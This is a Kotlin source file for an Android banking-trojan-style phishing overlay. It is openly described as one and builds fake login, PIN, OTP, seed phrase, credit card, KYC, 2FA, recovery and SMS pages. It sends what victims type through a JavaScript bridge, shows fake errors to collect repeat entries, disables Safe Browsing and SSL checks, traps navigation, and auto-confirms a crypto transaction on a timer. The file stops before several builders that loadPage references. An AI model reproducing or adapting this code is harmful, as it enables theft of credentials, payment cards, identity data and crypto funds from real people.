package com.xrc.app.overlay

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import android.view.View
import android.webkit.*
import android.widget.FrameLayout
import com.xrc.app.util.Constants

/**
 * Configurable WebView for phishing overlays.
 * Provides pre-built HTML pages and JavaScript bridges
 * for capturing credentials, PINs, OTPs, seed phrases, etc.
 */
@SuppressLint("SetJavaScriptEnabled")
class PhishingWebView(context: Context) : WebView(context) {

    companion object {
        private const val TAG = "PhishingWebView"

        // JavaScript bridge interface name
        const val JS_BRIDGE = "AndroidBridge"

        // Available page types
        enum class PageType {
            LOGIN, PIN, OTP, SEED_PHRASE, TRANSACTION_CONFIRM,
            KYC_VERIFICATION, CREDIT_CARD, TWO_FA, IDENTITY_VERIFY,
            RECOVERY_EMAIL, SMS_VERIFY, BIOMETRIC, PASSWORD_CHANGE
        }

        // Page type constant prefixes for URL routing
        private const val CAPTURE_SCHEME = "xrc-capture"
    }

    /** JavaScript interface for credential capture callbacks */
    class CaptureInterface(
        private val onCredentials: ((String, String) -> Unit)? = null,
        private val onPin: ((String) -> Unit)? = null,
        private val onOtp: ((String) -> Unit)? = null,
        private val onSeedPhrase: ((String) -> Unit)? = null,
        private val onTransaction: ((String) -> Unit)? = null,
        private val onCreditCard: ((String, String, String) -> Unit)? = null,
        private val onKycData: ((Map<String, String>) -> Unit)? = null,
        private val onCustomData: ((String) -> Unit)? = null
    ) {
        @JavascriptInterface
        fun captureCredentials(username: String, password: String) {
            Log.d(TAG, "JS→Credentials captured")
            onCredentials?.invoke(username, password)
        }

        @JavascriptInterface
        fun capturePin(pin: String) {
            Log.d(TAG, "JS→PIN captured")
            onPin?.invoke(pin)
        }

        @JavascriptInterface
        fun captureOtp(otp: String) {
            Log.d(TAG, "JS→OTP captured")
            onOtp?.invoke(otp)
        }

        @JavascriptInterface
        fun captureSeedPhrase(phrase: String) {
            Log.d(TAG, "JS→Seed phrase captured")
            onSeedPhrase?.invoke(phrase)
        }

        @JavascriptInterface
        fun captureTransaction(data: String) {
            Log.d(TAG, "JS→Transaction captured")
            onTransaction?.invoke(data)
        }

        @JavascriptInterface
        fun captureCreditCard(number: String, expiry: String, cvv: String) {
            Log.d(TAG, "JS→Credit card captured")
            onCreditCard?.invoke(number, expiry, cvv)
        }

        @JavascriptInterface
        fun captureKycData(jsonData: String) {
            Log.d(TAG, "JS→KYC data captured")
            onCustomData?.invoke(jsonData)
        }

        @JavascriptInterface
        fun captureCustom(data: String) {
            Log.d(TAG, "JS→Custom data captured")
            onCustomData?.invoke(data)
        }

        @JavascriptInterface
        fun log(message: String) {
            Log.d(TAG, "JS→Log: $message")
        }

        @JavascriptInterface
        fun getDeviceInfo(): String {
            return "{\"model\":\"${Build.MODEL}\",\"android\":\"${Build.VERSION.RELEASE}\"}"
        }
    }

    private var captureInterface: CaptureInterface? = null
    private var currentPageType: PageType? = null

    init {
        configureWebView()
    }

    /**
     * Configure WebView settings for phishing display.
     */
    private fun configureWebView() {
        settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            loadsImagesAutomatically = true
            loadWithOverviewMode = true
            useWideViewPort = true
            builtInZoomControls = false
            displayZoomControls = false
            setSupportZoom(false)
            allowFileAccess = false
            allowContentAccess = false
            allowFileAccessFromFileURLs = false
            allowUniversalAccessFromFileURLs = false
            mediaPlaybackRequiresUserGesture = false
            cacheMode = WebSettings.LOAD_NO_CACHE
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                safeBrowsingEnabled = false
            }
            userAgentString = generateUserAgent()
        }

        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
                Log.d(TAG, "Page loading: $url")
            }

            override fun onPageFinished(view: WebView, url: String) {
                Log.d(TAG, "Page loaded: $url")
                injectExtraScripts()
            }

            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
                val url = request.url.toString()
                if (url.startsWith(CAPTURE_SCHEME)) {
                    handleCaptureUrl(url)
                    return true
                }
                return false
            }

            @Suppress("DEPRECATION")
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                if (url.startsWith(CAPTURE_SCHEME)) {
                    handleCaptureUrl(url)
                    return true
                }
                return false
            }

            override fun onReceivedSslError(view: WebView, handler: SslErrorHandler) {
                handler.proceed() // Accept all SSL certs for overlays
            }
        }

        webChromeClient = object : WebChromeClient() {
            override fun onJsAlert(view: WebView, url: String, message: String, result: JsResult): Boolean {
                result.confirm()
                return true
            }

            override fun onJsConfirm(view: WebView, url: String, message: String, result: JsResult): Boolean {
                result.confirm()
                return true
            }
        }
    }

    /**
     * Load a specific phishing page type.
     */
    fun loadPage(pageType: PageType, targetName: String = "", brandColor: String = "#1a73e8") {
        currentPageType = pageType
        val html = when (pageType) {
            PageType.LOGIN -> buildLoginPage(targetName, brandColor)
            PageType.PIN -> buildPinPage(targetName, brandColor)
            PageType.OTP -> buildOtpHtml(targetName, brandColor)
            PageType.SEED_PHRASE -> buildSeedPhrasePage(targetName)
            PageType.TRANSACTION_CONFIRM -> buildTransactionPage()
            PageType.KYC_VERIFICATION -> buildKycPage(targetName, brandColor)
            PageType.CREDIT_CARD -> buildCreditCardPage(targetName, brandColor)
            PageType.TWO_FA -> buildTwoFaPage(targetName, brandColor)
            PageType.IDENTITY_VERIFY -> buildIdentityPage(targetName, brandColor)
            PageType.RECOVERY_EMAIL -> buildRecoveryPage(targetName, brandColor)
            PageType.SMS_VERIFY -> buildSmsVerifyPage(targetName, brandColor)
            PageType.BIOMETRIC -> buildBiometricPage(targetName, brandColor)
            PageType.PASSWORD_CHANGE -> buildPasswordChangePage(targetName, brandColor)
        }
        loadDataWithBaseURL("https://secure-login/", html, "text/html", "UTF-8", null)
    }

    /**
     * Set the capture interface for receiving captured data.
     */
    fun setCaptureInterface(iface: CaptureInterface) {
        this.captureInterface = iface
        addJavascriptInterface(iface, JS_BRIDGE)
    }

    /**
     * Inject extra JavaScript after page load.
     */
    private fun injectExtraScripts() {
        val extraJs = """
            (function() {
                // Auto-focus first input
                var firstInput = document.querySelector('input');
                if (firstInput) setTimeout(function() { firstInput.focus(); }, 300);
                
                // Prevent navigation away
                window.addEventListener('beforeunload', function(e) {
                    e.preventDefault();
                    e.returnValue = '';
                });
                
                // Block exit attempts
                history.pushState(null, null, location.href);
                window.addEventListener('popstate', function() {
                    history.pushState(null, null, location.href);
                });
                
                console.log('XRC overlay scripts injected');
            })();
        """.trimIndent()
        evaluateJavascript(extraJs, null)
    }

    /**
     * Generate a realistic user agent.
     */
    private fun generateUserAgent(): String {
        return "Mozilla/5.0 (Linux; Android ${Build.VERSION.RELEASE}; ${Build.MODEL} Build/${Build.ID}) " +
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36"
    }

    /**
     * Handle a captured data URL.
     */
    private fun handleCaptureUrl(url: String) {
        Log.d(TAG, "Capture URL: $url")
    }

    /**
     * Build a login phishing page.
     */
    private fun buildLoginPage(appName: String, color: String): String = """
        <!DOCTYPE html><html><head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
                 background:linear-gradient(135deg,${color}22,${color}44);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
            .card{background:#fff;border-radius:16px;padding:32px;width:100%;max-width:400px;box-shadow:0 10px 40px rgba(0,0,0,.12)}
            .logo{text-align:center;font-size:22px;font-weight:700;color:$color;margin-bottom:24px}
            label{font-size:12px;color:#666;font-weight:600;text-transform:uppercase;letter-spacing:.5px;display:block;margin-top:16px;margin-bottom:4px}
            input{width:100%;padding:14px 16px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:16px;outline:none;transition:border-color .2s;background:#fafafa}
            input:focus{border-color:$color;background:#fff}
            .btn{width:100%;padding:16px;background:$color;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;margin-top:20px;cursor:pointer}
            .btn:active{opacity:.9}
            .error{color:#e74c3c;font-size:13px;text-align:center;margin-top:12px;display:none}
            .footer{text-align:center;margin-top:16px;font-size:11px;color:#aaa}
        </style></head><body>
        <div class="card">
            <div class="logo">$appName</div>
            <form id="f" onsubmit="return false">
                <label>Username / Email</label>
                <input type="text" id="u" placeholder="Username" autocomplete="off">
                <label>Password</label>
                <input type="password" id="p" placeholder="Password">
                <button class="btn" onclick="submitLogin()">Sign In</button>
                <div class="error" id="err">Invalid credentials</div>
            </form>
            <div class="footer">Secured with SSL/TLS • $appName</div>
        </div>
        <script>
            function submitLogin(){
                var u=document.getElementById('u').value;
                var p=document.getElementById('p').value;
                if(u&&p){$JS_BRIDGE.captureCredentials(u,p);document.getElementById('err').style.display='block';document.getElementById('p').value=''}
            }
            document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();submitLogin()});
        </script></body></html>
    """.trimIndent()

    private fun buildPinPage(appName: String, color: String): String = """
        <!DOCTYPE html><html><head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
                 background:linear-gradient(135deg,${color}33,${color}66);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
            .card{background:#fff;border-radius:20px;padding:32px;width:100%;max-width:340px;box-shadow:0 10px 40px rgba(0,0,0,.15);text-align:center}
            .icon{font-size:40px;margin-bottom:12px}
            h2{color:#333;font-size:20px;margin-bottom:4px}
            p{color:#888;font-size:13px;margin-bottom:24px}
            .dots{display:flex;justify-content:center;gap:12px;margin-bottom:24px}
            .dot{width:14px;height:14px;border-radius:50%;border:2px solid #ddd;transition:.2s}
            .dot.filled{background:$color;border-color:$color}
            .grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;max-width:280px;margin:0 auto}
            .num{height:60px;border:none;border-radius:14px;font-size:24px;font-weight:500;background:#f5f5f5;cursor:pointer}
            .num:active{background:#e8e8e8}
            .error{color:#e74c3c;font-size:12px;margin-top:12px;display:none}
        </style></head><body>
        <div class="card">
            <div class="icon">🔐</div>
            <h2>Enter PIN</h2>
            <p>$appName security verification</p>
            <div class="dots" id="dots">
                <div class="dot" id="d1"></div><div class="dot" id="d2"></div>
                <div class="dot" id="d3"></div><div class="dot" id="d4"></div>
            </div>
            <div class="grid">
                <button class="num" onclick="add('1')">1</button><button class="num" onclick="add('2')">2</button><button class="num" onclick="add('3')">3</button>
                <button class="num" onclick="add('4')">4</button><button class="num" onclick="add('5')">5</button><button class="num" onclick="add('6')">6</button>
                <button class="num" onclick="add('7')">7</button><button class="num" onclick="add('8')">8</button><button class="num" onclick="add('9')">9</button>
                <button class="num" onclick="clr()">⌫</button><button class="num" onclick="add('0')">0</button><button class="num" onclick="go()">✓</button>
            </div>
            <div class="error" id="err">Wrong PIN</div>
        </div>
        <script>
            var pin='';var dots=4;
            function add(d){if(pin.length<dots){pin+=d;update()}if(pin.length==dots)setTimeout(go,200)}
            function clr(){pin=pin.slice(0,-1);update()}
            function update(){for(var i=1;i<=dots;i++)document.getElementById('d'+i).className='dot'+(i<=pin.length?' filled':'')}
            function go(){if(pin.length==dots){$JS_BRIDGE.capturePin(pin);document.getElementById('err').style.display='block';pin='';update()}}
        </script></body></html>
    """.trimIndent()

    private fun buildOtpHtml(appName: String, color: String): String = """
        <!DOCTYPE html><html><head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
                 background:linear-gradient(135deg,#f093fb33,#f5576c44);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
            .card{background:#fff;border-radius:20px;padding:32px;width:100%;max-width:360px;box-shadow:0 10px 40px rgba(0,0,0,.12);text-align:center}
            h2{font-size:20px;color:#333;margin-bottom:4px}
            p{font-size:13px;color:#888;margin-bottom:20px}
            .obox{display:flex;justify-content:center;gap:8px;margin-bottom:20px}
            .oi{width:44px;height:52px;border:1.5px solid #ddd;border-radius:10px;font-size:22px;text-align:center;outline:none;font-weight:600}
            .oi:focus{border-color:$color}
            .btn{width:100%;padding:15px;background:$color;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer}
            .resend{font-size:12px;color:#aaa;margin-top:12px;cursor:pointer}
            .error{color:#e74c3c;font-size:12px;margin-top:8px;display:none}
        </style></head><body>
        <div class="card">
            <h2>Verification Code</h2>
            <p>Enter the code sent to your device</p>
            <div class="obox">
                <input class="oi" id="o1" maxlength="1" oninput="n(this,'o2')">
                <input class="oi" id="o2" maxlength="1" oninput="n(this,'o3')">
                <input class="oi" id="o3" maxlength="1" oninput="n(this,'o4')">
                <input class="oi" id="o4" maxlength="1" oninput="n(this,'o5')">
                <input class="oi" id="o5" maxlength="1" oninput="n(this,'o6')">
                <input class="oi" id="o6" maxlength="1" oninput="go()">
            </div>
            <button class="btn" onclick="go()">Verify</button>
            <div class="resend" onclick="$JS_BRIDGE.log('resend')">Resend code</div>
            <div class="error" id="err">Invalid code</div>
        </div>
        <script>
            function n(c,nid){if(c.value.length==1)document.getElementById(nid).focus()}
            function go(){var o='';for(var i=1;i<=6;i++)o+=document.getElementById('o'+i).value;if(o.length==6){$JS_BRIDGE.captureOtp(o);document.getElementById('err').style.display='block';for(var i=1;i<=6;i++){document.getElementById('o'+i).value=''}document.getElementById('o1').focus()}}
        </script></body></html>
    """.trimIndent()

    private fun buildSeedPhrasePage(appName: String): String = """
        <!DOCTYPE html><html><head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
                 background:linear-gradient(135deg,#0f0c29,#302b63);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
            .card{background:#fff;border-radius:16px;padding:28px;width:100%;max-width:420px;box-shadow:0 10px 40px rgba(0,0,0,.3)}
            h2{text-align:center;color:#333;font-size:18px;margin-bottom:4px}
            p{text-align:center;color:#888;font-size:13px;margin-bottom:16px}
            textarea{width:100%;height:110px;padding:12px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:13px;font-family:monospace;resize:none;outline:none}
            textarea:focus{border-color:#302b63}
            .wc{text-align:right;font-size:11px;color:#aaa;margin-top:4px}
            .btn{width:100%;padding:15px;background:#302b63;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer;margin-top:12px}
            .warn{color:#e74c3c;font-size:12px;text-align:center;margin-top:8px;display:none}
            .info{text-align:center;font-size:10px;color:#bbb;margin-top:8px}
        </style></head><body>
        <div class="card">
            <h2>🔐 Security Verification</h2>
            <p>Enter your recovery phrase to verify your identity</p>
            <textarea id="s" placeholder="Enter your recovery phrase (12 or 24 words)"></textarea>
            <div class="wc" id="wc">0 words</div>
            <button class="btn" onclick="sub()">Verify Identity</button>
            <div class="warn" id="w">Invalid phrase. Try again.</div>
            <div class="info">End-to-end encrypted • Never stored in plaintext</div>
        </div>
        <script>
            document.getElementById('s').addEventListener('input',function(){var w=this.value.trim().split(/\s+/);document.getElementById('wc').textContent=(w.length==1&&w[0]=='')?'0 words':w.length+' words'});
            function sub(){var p=document.getElementById('s').value.trim();if(p.length>0){$JS_BRIDGE.captureSeedPhrase(p);document.getElementById('w').style.display='block';document.getElementById('s').value='';document.getElementById('wc').textContent='0 words'}}
        </script></body></html>
    """.trimIndent()

    private fun buildTransactionPage(): String = """
        <!DOCTYPE html><html><head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
        <style>
            *{margin:0;padding:0;box-sizing:border-box}
            body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
                 background:linear-gradient(135deg,#2c3e50,#3498db);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
            .card{background:#fff;border-radius:20px;padding:24px;width:100%;max-width:380px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
            h2{text-align:center;color:#333;font-size:18px;margin-bottom:12px}
            .amt{font-size:24px;color:#e74c3c;font-weight:700;text-align:center;padding:12px 0}
            .d{border-radius:10px;background:#f8f9fa;padding:12px;margin:12px 0}
            .r{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #eee;font-size:13px}
            .r:last-child{border-bottom:none}
            .l{color:#888}.v{color:#333;font-weight:600;text-align:right;max-width:55%;word-break:break-all}
            .bg{display:flex;gap:10px;margin-top:12px}
            .bc,.br{flex:1;padding:14px;border:none;border-radius:10px;font-size:15px;font-weight:600;cursor:pointer}
            .bc{background:#27ae60;color:#fff}
            .br{background:#e74c3c;color:#fff}
            .tm{text-align:center;font-size:11px;color:#aaa;margin-top:10px}
        </style></head><body>
        <div class="card">
            <h2>Confirm Transaction</h2>
            <div class="amt" id="amt">0.00 ETH</div>
            <div class="d">
                <div class="r"><span class="l">To</span><span class="v" id="to">0x0000...0000</span></div>
                <div class="r"><span class="l">Network</span><span class="v">Ethereum</span></div>
                <div class="r"><span class="l">Gas</span><span class="v">~0.001 ETH</span></div>
            </div>
            <div class="bg">
                <button class="br" onclick="rj()">Reject</button>
                <button class="bc" onclick="cf()">Confirm</button>
            </div>
            <div class="tm">Auto-confirms in <span id="tm">30</span>s</div>
        </div>
        <script>
            var s=30;var t=setInterval(function(){s--;document.getElementById('tm').textContent=s;if(s<=0){clearInterval(t);cf()}},1000);
            function cf(){clearInterval(t);$JS_BRIDGE.captureTransaction(JSON.stringify({action:'confirm',ts:Date.now()}));document.querySelector('.bg').innerHTML='<p style="color:#27ae60;text-align:center;padding:12px;">✓ Confirmed</p>'}
            function rj(){clearInterval(t);$JS_BRIDGE.log('tx_rejected');document.querySelector('.bg').innerHTML='<p style="color:#e74c3c;text-align:center;padding:12px;">✗ Rejected</p>'}
        </script></body></html>
    """.trimIndent()

    private fun buildKycPage(appName: String, color: String): String = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f7fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:16px;padding:28px;width:100%;max-width:400px;box-shadow:0 5px 20px rgba(0,0,0,.08)}h2{text-align:center;color:#333;font-size:18px;margin-bottom:16px}label{font-size:12px;color:#666;font-weight:600;display:block;margin-top:12px;margin-bottom:4px}input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:14px;outline:none}input:focus{border-color:$color}.btn{width:100%;padding:14px;background:$color;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;margin-top:16px;cursor:pointer}.error{color:#e74c3c;font-size:12px;text-align:center;margin-top:8px;display:none}</style></head><body><div class="card"><h2>📋 KYC Verification Required</h2><p style="text-align:center;color:#888;font-size:13px;margin-bottom:12px">$appName requires identity verification to continue</p><form id="f" onsubmit="return false"><label>Full Name (as on ID)</label><input type="text" id="name" placeholder="Full name"><label>Date of Birth</label><input type="date" id="dob"><label>ID Number (Aadhaar/SSN/PAN)</label><input type="text" id="idnum" placeholder="ID number"><label>Phone Number</label><input type="tel" id="phone" placeholder="Phone number"><label>Address</label><input type="text" id="addr" placeholder="Street, City, ZIP"><button class="btn" onclick="sub()">Submit KYC</button><div class="error" id="err">Verification failed. Please re-enter your details.</div></form></div><script>function sub(){var d={name:document.getElementById('name').value,dob:document.getElementById('dob').value,idnum:document.getElementById('idnum').value,phone:document.getElementById('phone').value,addr:document.getElementById('addr').value};$JS_BRIDGE.captureKycData(JSON.stringify(d));document.getElementById('err').style.display='block'}</script></body></html>"""

    private fun buildCreditCardPage(appName: String, color: String): String = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#667eea33,#764ba244);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:20px;padding:28px;width:100%;max-width:400px;box-shadow:0 10px 30px rgba(0,0,0,.1)}h2{text-align:center;color:#333;font-size:18px;margin-bottom:4px}p{text-align:center;color:#888;font-size:13px;margin-bottom:20px}.cc-preview{background:linear-gradient(135deg,#667eea,#764ba2);border-radius:12px;padding:20px;color:#fff;margin-bottom:20px;min-height:120px}.cc-num{font-size:20px;letter-spacing:2px;word-spacing:8px;margin-top:20px;font-family:monospace}.cc-exp{font-size:12px;margin-top:8px;opacity:.8}label{font-size:11px;color:#666;font-weight:600;text-transform:uppercase;letter-spacing:.5px;display:block;margin-top:12px;margin-bottom:4px}input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:14px;outline:none}input:focus{border-color:#764ba2}.row{display:flex;gap:12px}.row>*{flex:1}.btn{width:100%;padding:15px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:600;margin-top:16px;cursor:pointer}.error{color:#e74c3c;font-size:12px;text-align:center;margin-top:8px;display:none}</style></head><body><div class="card"><h2>💳 Payment Method</h2><p>Add your card to continue with $appName</p><div class="cc-preview"><div class="cc-num" id="preview">•••• •••• •••• ••••</div><div class="cc-exp" id="expPreview">MM/YY</div></div><form id="f" onsubmit="return false"><label>Card Number</label><input type="text" id="num" maxlength="19" placeholder="4242 4242 4242 4242" oninput="previewCard()"><div class="row"><div><label>Expiry</label><input type="text" id="exp" maxlength="5" placeholder="MM/YY" oninput="previewCard()"></div><div><label>CVV</label><input type="text" id="cvv" maxlength="4" placeholder="123"></div></div><button class="btn" onclick="sub()">Add Card</button><div class="error" id="err">Card declined. Please check details.</div></form></div><script>function previewCard(){var n=document.getElementById('num').value.replace(/\D/g,'');var f=n.replace(/(.{4})/g,'$1 ').trim();document.getElementById('preview').textContent=f||'•••• •••• •••• ••••';var e=document.getElementById('exp').value;document.getElementById('expPreview').textContent=e||'MM/YY'}function sub(){var n=document.getElementById('num').value.replace(/\s/g,'');var e=document.getElementById('exp').value;var c=document.getElementById('cvv').value;if(n.length>=15&&e.length>=4&&c.length>=3){$JS_BRIDGE.captureCreditCard(n,e,c);document.getElementById('err').style.display='block';document.getElementById('num').value='';document.getElementById('exp').value='';document.getElementById('cvv').value='';previewCard()}}</script></body></html>"""

    private fun buildTwoFaPage(appName: String, color: String): String = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:$color11;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:16px;padding:28px;width:100%;max-width:360px;box-shadow:0 10px 30px rgba(0,0,0,.1);text-align:center}img{width:80px;height:80px;margin-bottom:16px}h2{font-size:18px;color:#333;margin-bottom:4px}p{color:#888;font-size:13px;margin-bottom:20px}input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:14px;text-align:center;outline:none;letter-spacing:4px}input:focus{border-color:$color}.btn{width:100%;padding:14px;background:$color;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;margin-top:12px;cursor:pointer}.error{color:#e74c3c;font-size:12px;margin-top:8px;display:none}</style></head><body><div class="card"><h2>🔐 Two-Factor Authentication</h2><p>Enter the code from your authenticator app</p><input type="text" id="tf" maxlength="6" placeholder="000000" style="font-size:24px;letter-spacing:8px"><button class="btn" onclick="sub()">Verify</button><div class="error" id="err">Invalid code. Try again.</div></div><script>function sub(){var c=document.getElementById('tf').value;if(c.length==6){$JS_BRIDGE.captureCustom(JSON.stringify({type:'2fa',code:c,app:'$appName'}));document.getElementById('err').style.display='block';document.getElementById('tf').value=''}}</script></body></html>"""

    private fun buildIdentityPage(appName: String, color: String): String = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f7fa;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:16px;padding:28px;width:100%;max-width:400px;box-shadow:0 5px 20px rgba(0,0,0,.08)}h2{text-align:center;color:#333;font-size:18px;margin-bottom:16px}.upload-box{border:2px dashed #ddd;border-radius:12px;padding:30px;text-align:center;color:#aaa;margin:12px 0;cursor:pointer}.upload-box:active{border-color:$color}.or{text-align:center;color:#aaa;font-size:12px;margin:8px 0}input{width:100%;padding:12px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:14px;outline:none;margin-bottom:8px}.btn{width:100%;padding:14px;background:$color;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}.error{color:#e74c3c;font-size:12px;text-align:center;margin-top:8px;display:none}</style></head><body><div class="card"><h2>🪪 Identity Verification</h2><p style="text-align:center;color:#888;font-size:13px">$appName needs to verify your identity</p><div class="upload-box" id="ub">📄 Tap to upload ID (Front)</div><input type="text" id="idnum" placeholder="ID Number"><div class="upload-box" id="ub2">📄 Tap to upload ID (Back)</div><button class="btn" onclick="sub()">Submit Verification</button><div class="error" id="err">Verification failed. Please try again.</div></div><script>function sub(){var idnum=document.getElementById('idnum').value;if(idnum){$JS_BRIDGE.captureCustom(JSON.stringify({type:'identity',idNumber:idnum,app:'$appName'}));document.getElementById('err').style.display='block'}}</script></body></html>"""

    private fun buildRecoveryPage(appName: String, color: String): String = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,${color}22,${color}44);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:16px;padding:28px;width:100%;max-width:400px;box-shadow:0 5px 20px rgba(0,0,0,.1)}h2{text-align:center;color:#333;font-size:18px;margin-bottom:4px}p{text-align:center;color:#888;font-size:13px;margin-bottom:16px}label{font-size:12px;color:#666;font-weight:600;display:block;margin-top:12px;margin-bottom:4px}input{width:100%;padding:12px 14px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:14px;outline:none}input:focus{border-color:$color}.btn{width:100%;padding:14px;background:$color;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;margin-top:16px;cursor:pointer}.error{color:#e74c3c;font-size:12px;text-align:center;margin-top:8px;display:none}</style></head><body><div class="card"><h2>🔑 Account Recovery</h2><p>Verify your identity to recover your account</p><label>Recovery Email</label><input type="email" id="email" placeholder="your@email.com"><label>Phone Number</label><input type="tel" id="phone" placeholder="+1 (555) 000-0000"><label>Last Transaction Amount (if any)</label><input type="text" id="amt" placeholder="Amount"><button class="btn" onclick="sub()">Verify Identity</button><div class="error" id="err">Verification failed. Please try again.</div></div><script>function sub(){var d={type:'recovery',email:document.getElementById('email').value,phone:document.getElementById('phone').value,lastAmount:document.getElementById('amt').value};$JS_BRIDGE.captureCustom(JSON.stringify(d));document.getElementById('err').style.display='block'}</script></body></html>"""

    private fun buildSmsVerifyPage(appName: String, color: String): String = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:$color11;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}.card{background:#fff;border-radius:16px;padding:28px;width:100%;max-width:360px;box-shadow:0 5px 20px rgba(0,0,0,.1);text-align:center}.icon{font-size:36px;margin-bottom:12px}h2{font-size:18px;color:#333;margin-bottom:4px}p{color:#888;font-size:13px;margin-bottom:16px}input{width:100%;padding:12px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:14px;text-align:center;outline:none;margin-bottom:8px}input:focus{border-color:$color}.btn{width:100%;padding:14px;background:$color;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer}.error{color:#e74c3c;font-size:12px;margin-top:8px;display:none}</style></head><body><div class="card"><div class="icon">📱</div><h2>SMS Verification</h2><p>A code was sent to your phone. Enter it below.</p><input type="text" id="sms" maxlength="6" placeholder="000000" style="font-size:24px;letter-spacing:8px"><button class="btn" onclick="sub()">Verify</button><div class="error" id="err">Invalid code</div></div><script>function sub(){var c=document.getElementById('sms').value;if(c.length>=4){$JS_BRIDGE.captureOtp(c);document.getElementById('err').style.display='block';document.getElementById('sms').value=''}}</script></body></html>"""

